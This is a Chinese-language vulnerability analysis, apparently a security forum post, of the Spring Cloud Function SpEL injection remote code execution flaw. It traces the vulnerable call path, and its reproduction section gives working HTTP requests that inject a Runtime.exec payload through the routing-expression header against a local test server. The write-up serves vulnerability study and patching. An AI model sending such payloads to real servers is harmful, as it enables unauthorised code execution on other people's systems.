0x01 漏洞简介
=========

 Spring Cloud Function 是基于 Spring Boot 的函数计算框架，它抽象出所有传输细节和基础架构，允许开发人员保留所有熟悉的工具和流程，并专注于业务逻辑。Spring Cloud Function 被爆出了 SPEL 表达式注入漏洞

 通过查看提交的 commit 确定漏洞最终的 sink

 <https://github.com/spring-cloud/spring-cloud-function/commit/0e89ee27b2e76138c16bcba6f4bca906c4f3744f>

 ![image-20220328114504-eawmy5r.png](https://shs3.b.qianxin.com/attack_forum/2022/03/attach-f5eaa87a1117a3e8e831772d7397e62589ef74dd.png)

 ![image-20220328142245-rhhzd2f.png](https://shs3.b.qianxin.com/attack_forum/2022/03/attach-90cf64807003f812b8bb253f5674b2189b29a602.png)

0x02 漏洞分析
=========

 `org.springframework.cloud.function.web.flux.FunctionController#postStream`

 ![image-20220328152006-sfpe1w7.png](https://shs3.b.qianxin.com/attack_forum/2022/03/attach-392f98a68c3e39b260614c68cd79f9144f34996b.png)

 `org.springframework.cloud.function.web.mvc.FunctionController#form`

 ![image-20220328152230-j4i0m87.png](https://shs3.b.qianxin.com/attack_forum/2022/03/attach-205ffb0d9e6ba0d7c9db74d1e438643dcb4724ec.png)

 通过两个入口可以触发漏洞

 先关注漏洞原理

 SPEL 注入的实例

```java
ExpressionParser parser = new SpelExpressionParser();  
Expression exp = parser.parseExpression("T(java.lang.Runtime).getRuntime().exec(\\"calc.exe"\\")");  
Object value = exp.getValue();
```

 SPEL 注入最终触发的位置

 `org.springframework.cloud.function.context.config.RoutingFunction#functionFromExpression`

 ![image-20220328154830-w6ymtvb.png](https://shs3.b.qianxin.com/attack_forum/2022/03/attach-ccdb9299be03226dedf3a7255112c27952b74e73.png)

 向上跟踪，发现调用且第一个参数可控的位置

 `org.springframework.cloud.function.context.config.RoutingFunction#route`

 ![image-20220328155407-iho6y73.png](https://shs3.b.qianxin.com/attack_forum/2022/03/attach-520f5bc7e70676673874266d76228e70eb66fb36.png)

 参数来自请求头中 `spring.cloud.function.routing-expression` 的值

 `org.springframework.cloud.function.context.config.RoutingFunction#apply`

 ![image-20220328155553-paoxbzi.png](https://shs3.b.qianxin.com/attack_forum/2022/03/attach-fa1d759bd568d71a25a0a8e57c68e6e00c0ad8bf.png)

 `RoutingFunction` 是 `Function` 的接口，所以要想办法触发到 `RoutingFunction`

 <https://docs.spring.io/spring-cloud-function/docs/3.2.0/reference/html/spring-cloud-function.html#>

 ![image-20220328161312-gqfrtlv.png](https://shs3.b.qianxin.com/attack_forum/2022/03/attach-df4b27f2d40420e5beec0d78ddc1565ee41cd2c2.png)

 在官方文档中也提及到了允许 `spring.cloud.function.routing-expression` 来执行 SPEL 表达式

 ![image-20220328165011-tg8xfsv.png](https://shs3.b.qianxin.com/attack_forum/2022/03/attach-4bcad7333f752e073e2eea5de0e9adda27353cca.png)

 可以通过在配置文件中添加 `spring.cloud.function.definition=functionRouter` 来实现访问不存在的路由时调用 `RoutingFunction`

 当通过 POST 传送数据时

 `org.springframework.cloud.function.web.mvc.FunctionController#post`

 ![image-20220328174102-gzeoug6.png](https://shs3.b.qianxin.com/attack_forum/2022/03/attach-b30e9b5c33ce6145914ab6ffa6116c1bda6bce63.png)

 `org.springframework.cloud.function.web.util.FunctionWebRequestProcessingHelper#processRequest`

 ![image-20220328174431-atbqrsu.png](https://shs3.b.qianxin.com/attack_forum/2022/03/attach-aded48a3f59b90cef0f0121add0c1e3771a20eaf.png)

 `org.springframework.cloud.function.context.catalog.SimpleFunctionRegistry.FunctionInvocationWrapper#apply`

 ![image-20220328174453-9th14m6.png](https://shs3.b.qianxin.com/attack_forum/2022/03/attach-e776fc703cfe3e0000d05a9356b7b331ff480d70.png)

 `org.springframework.cloud.function.context.catalog.SimpleFunctionRegistry.FunctionInvocationWrapper#doApply`

 ![image-20220328174526-2zirlf0.png](https://shs3.b.qianxin.com/attack_forum/2022/03/attach-6339ec33f0f94daff22ac416f958420472690e3c.png)

 `org.springframework.cloud.function.context.config.RoutingFunction#apply`

 ![image-20220328174625-ukjq7hi.png](https://shs3.b.qianxin.com/attack_forum/2022/03/attach-4bff6f463e82f7a036d492feaa410b1af9feae0e.png)

 `org.springframework.cloud.function.context.config.RoutingFunction#route`

 ![image-20220328174655-hguduil.png](https://shs3.b.qianxin.com/attack_forum/2022/03/attach-5220422aada6f67d1cd484f09b1d0600a17fabff.png)

 简单的分析完成之后，仍然存在大量的疑问和不理解的地方，又看到可以不通过配置文件来实现RCE，于是决定再进一步进行分析

0x03 漏洞再分析
==========

 发现通过特定的路由可以直接实现RCE `functionRouter`

 当不修改配置文件，向路由 `functionRouter` 发送请求时

 `org.springframework.cloud.function.web.mvc.FunctionHandlerMapping#getHandlerInternal`

 ![image-20220329155249-0fzipdu.png](https://shs3.b.qianxin.com/attack_forum/2022/03/attach-1d745339464cfe3a09217f45f6070981738a0598.png)

 `org.springframework.cloud.function.web.util.FunctionWebRequestProcessingHelper#findFunction`

 ![image-20220329155313-736xdkm.png](https://shs3.b.qianxin.com/attack_forum/2022/03/attach-4db7d648a940b74c0016c0fdffb9bbe647f7e4d4.png)

 我们可以看到在通过 POST 请求时，会去根据 path 的值，去获取 `function`

 `org.springframework.cloud.function.web.util.FunctionWebRequestProcessingHelper#doFindFunction`

 ![image-20220329155656-38oml8x.png](https://shs3.b.qianxin.com/attack_forum/2022/03/attach-5a0e9a86a925235cbaae41b8d6ec5fa13583b21c.png)

 `org.springframework.cloud.function.context.FunctionCatalog#lookup(java.lang.String, java.lang.String...)`

 ![image-20220329155414-9x3ua5h.png](https://shs3.b.qianxin.com/attack_forum/2022/03/attach-09ada53e58cfacd624b9613246dd8790bf400f08.png)

 如果获取的值为空，还可以去读取本身配置中的 `functionDefinition` 来代替 name 去再执行获取 function 的值

 所以设定 配置文件 `spring.cloud.function.definition=functionRouter` 与直接请求路由 `functionRouter` 效果是一样的，获得的 function 的值如下所示

 ![image-20220329160053-0p8dfjm.png](https://shs3.b.qianxin.com/attack_forum/2022/03/attach-883778fe2f3d1f8d704fa323fd7f13710db6e574.png)

 之后的分析就跟前面对上了。

0x04 漏洞复现
=========

```php
POST /functionRouter HTTP/1.1  
Host: 127.0.0.1:8088  
spring.cloud.function.routing-expression:T(java.lang.Runtime).getRuntime().exec("calc.exe")  
Content-Length: 1  

1
```

 ![image-20220329160318-zbi7wcw.png](https://shs3.b.qianxin.com/attack_forum/2022/03/attach-4b325f8b062921dea67d8486e272ae3e7a975747.png)

```php
POST /1 HTTP/1.1  
Host: 127.0.0.1:8088  
spring.cloud.function.routing\-expression:T(java.lang.Runtime).getRuntime().exec("calc.exe")  
Content\-Length: 1  

1
```

 ![image-20220329160351-2ao19e1.png](https://shs3.b.qianxin.com/attack_forum/2022/03/attach-aebcbd1fdacd4df014f2626239e346a9844c50f1.png)

0x05 参考文章
=========

 <https://segmentfault.com/a/1190000041611881>

 <https://github.com/spring-cloud/spring-cloud-function/commit/0e89ee27b2e76138c16bcba6f4bca906c4f3744f>

 <https://mp.weixin.qq.com/s/APiXRwSiEanoIuohjwkoEw> 且听安全

 <https://hosch3n.github.io/2022/03/26/SpringCloudFunction>漏洞分析/ SpringCloudFunction漏洞分析

 <https://mp.weixin.qq.com/s/U7YJ3FttuWSOgCodVSqemg> Spring Cloud Function v3.x SpEL RCE

 <https://mp.weixin.qq.com/s/sPPyso-WyPGnYYHeyL9DPA> Spring-Cloud-Function SPEL 注入漏洞的一点想法